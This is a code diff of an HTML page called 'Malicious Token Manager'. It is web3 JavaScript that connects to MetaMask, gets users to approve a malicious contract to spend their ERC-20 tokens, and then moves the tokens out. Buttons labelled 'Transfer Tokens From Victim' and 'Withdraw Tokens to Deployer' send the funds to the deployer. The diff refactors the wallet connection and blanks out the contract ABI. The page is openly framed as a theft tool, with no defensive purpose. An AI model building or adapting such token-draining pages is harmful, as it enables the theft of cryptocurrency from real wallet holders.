@@ -7,175 +7,45 @@
 <body>
     <h1>Malicious Token Manager</h1>
 
-<!-- Connect MetaMask Button -->
-<button id="connectBtn">Connect MetaMask</button>
-
-<script>
-    // Initialize Web3 and contract
-    let web3;
-    let accounts;
-
-    async function connectMetaMask() {
-        if (typeof window.ethereum !== 'undefined') {
-            // Request account access
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            web3 = new Web3(window.ethereum);
-            accounts = await web3.eth.getAccounts();
-            alert("MetaMask connected successfully!");
-            // Enable your other buttons here, e.g.,:
-            // document.getElementById("approveBtn").disabled = false;
-            // document.getElementById("checkAllowanceBtn").disabled = false;
-        } else {
-            alert("Please install MetaMask!");
-        }
-    }
-
-    // Connect MetaMask event listener
-    document.getElementById("connectBtn").addEventListener("click", connectMetaMask);
-</script>
-
-
-    <!-- Buttons for interacting with the contract -->
-    <button id="approveBtn">Approve Tokens</button>
-    <button id="checkAllowanceBtn">Check Allowance</button>
-    <button id="transferTokensBtn">Transfer Tokens From Victim</button>
-    <button id="withdrawTokensBtn">Withdraw Tokens to Deployer</button>
+    <!-- Connect MetaMask Button -->
+    <button id="connectBtn">Connect MetaMask</button>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+
     <script>
-        // Connect to Ethereum
-        const web3 = new Web3(window.ethereum);
+        // Declare variables for web3 and accounts globally
+        let web3;
+        let accounts;
         let contract;
+
         const contractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8";  // Replace with your malicious contract address
-        const tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575";     // Replace with ERC-20 token address
-        const contractABI = [{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "owner",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			}
-		],
-		"name": "allowance",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "approve",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "account",
-				"type": "address"
-			}
-		],
-		"name": "balanceOf",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transfer",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "sender",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transferFrom",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	}];        // Replace with the contract ABI you provided
+        const tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575"; // Replace with ERC-20 token address
+        const contractABI = [ /* Insert your ABI here */ ];
 
-        async function init() {
-            await window.ethereum.enable();
-            const accounts = await web3.eth.getAccounts();
-            const deployerAddress = accounts[0];
+        // Connect to MetaMask and initialize Web3 and contract
+        async function connectMetaMask() {
+            if (typeof window.ethereum !== 'undefined') {
+                // Request account access
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                accounts = await web3.eth.getAccounts();
+                alert("MetaMask connected successfully!");
 
-            contract = new web3.eth.Contract(contractABI, contractAddress);
+                // Initialize contract after MetaMask is connected
+                contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                // Enable your other buttons here
+                document.getElementById("approveBtn").disabled = false;
+                document.getElementById("checkAllowanceBtn").disabled = false;
+                document.getElementById("transferTokensBtn").disabled = false;
+                document.getElementById("withdrawTokensBtn").disabled = false;
+            } else {
+                alert("Please install MetaMask!");
+            }
         }
+
+        // Connect MetaMask event listener
+        document.getElementById("connectBtn").addEventListener("click", connectMetaMask);
 
         // Approve the contract to spend tokens
         document.getElementById("approveBtn").addEventListener("click", async () => {
@@ -205,15 +75,20 @@
 
         // Withdraw tokens to the deployer's address
         document.getElementById("withdrawTokensBtn").addEventListener("click", async () => {
-            const deployerAddress = await web3.eth.getAccounts()[0];
+            const deployerAddress = accounts[0];
             const contractBalance = await contract.methods.balanceOf(contractAddress).call();
 
             await contract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
             alert("Tokens withdrawn to deployer!");
         });
-
-        init();
     </script>
+
+    <!-- Buttons for interacting with the contract -->
+    <button id="approveBtn" disabled>Approve Tokens</button>
+    <button id="checkAllowanceBtn" disabled>Check Allowance</button>
+    <button id="transferTokensBtn" disabled>Transfer Tokens From Victim</button>
+    <button id="withdrawTokensBtn" disabled>Withdraw Tokens to Deployer</button>
+
 </body>
 </html>
 
